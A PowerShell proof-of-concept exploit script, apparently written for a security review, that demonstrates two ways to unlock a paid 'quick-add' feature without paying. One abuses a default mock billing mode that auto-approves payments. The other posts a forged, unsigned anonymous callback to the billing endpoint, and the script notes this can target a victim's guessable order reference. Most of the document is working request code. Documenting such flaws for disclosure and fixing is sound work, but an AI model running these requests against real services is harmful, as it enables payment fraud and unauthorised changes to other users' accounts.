# PoC #2 — Paywall bypass: unlock the paid "quick-add" feature for free
#
# TWO independent bypasses, both confirmed by static analysis:
#
# (A) Mock-mode self-confirm (default config). Billing:Mock defaults to true
#     (server/appsettings.json:15, BillingService.cs:43). ConfirmAsync treats Mock
#     as "always approved" (BillingService.cs:109):
#        var approved = Mock || await CheckWayForPayApprovedAsync(...);
#     So any authenticated user can: checkout -> confirm -> QuickAddUnlocked=true,
#     paying nothing. In the shipped default this is a 100% free unlock.
#
# (B) Forged server callback — works even with Mock=false (production).
#     POST /api/billing/callback is [AllowAnonymous] (BillingController.cs:67) and
#     HandleCallbackAsync (BillingService.cs:117-139) NEVER verifies the incoming
#     merchantSignature. It simply parses orderReference + transactionStatus and, if
#     status=="Approved", flips QuickAddUnlocked=true. An attacker who knows a valid
#     Pending orderReference (e.g. their own from /billing/checkout, or a victim's —
#     format "qa-{userId}-{yyyyMMddHHmmss}-{6hex}") unlocks the account with a plain
#     unauthenticated HTTP POST and no money and no valid signature.
#
# EXECUTION STATUS: NOT executed here (no running server/DB). Requests are concrete.

param(
  [string]$BaseUrl = "http://localhost:5080",
  [string]$Token   = ""   # a normal logged-in user's JWT (for parts A and B setup)
)

$auth = @{ Authorization = "Bearer $Token" }

Write-Host "=== Bypass (A): mock-mode self-confirm ==="
# 1) start checkout to obtain an orderReference
$checkout = Invoke-RestMethod -Uri "$BaseUrl/api/billing/checkout" -Method Post -Headers $auth
$orderRef = $checkout.orderReference
Write-Host "orderReference = $orderRef (mock=$($checkout.mock))"
# 2) confirm — in mock mode this returns paid=true without any payment
$confirm = Invoke-RestMethod -Uri "$BaseUrl/api/billing/confirm" -Method Post -Headers $auth `
  -ContentType "application/json" -Body (@{ orderReference = $orderRef } | ConvertTo-Json)
Write-Host "confirm result: $($confirm | ConvertTo-Json -Compress)"
$status = Invoke-RestMethod -Uri "$BaseUrl/api/quick-add/status" -Headers $auth
Write-Host "status after confirm (expect Unlocked=true): $($status | ConvertTo-Json -Compress)"

Write-Host "`n=== Bypass (B): forged anonymous callback (no signature, works in production) ==="
# Re-use the orderReference above (or a victim's guessed one). NOTE: no Authorization header.
$forged = @{ orderReference = $orderRef; transactionStatus = "Approved" } | ConvertTo-Json
$ack = Invoke-RestMethod -Uri "$BaseUrl/api/billing/callback" -Method Post `
  -ContentType "application/json" -Body $forged
Write-Host "server accepted forged callback, replied: $($ack | ConvertTo-Json -Compress)"
Write-Host "The payment tied to $orderRef is now Approved and the owner's QuickAddUnlocked=true."
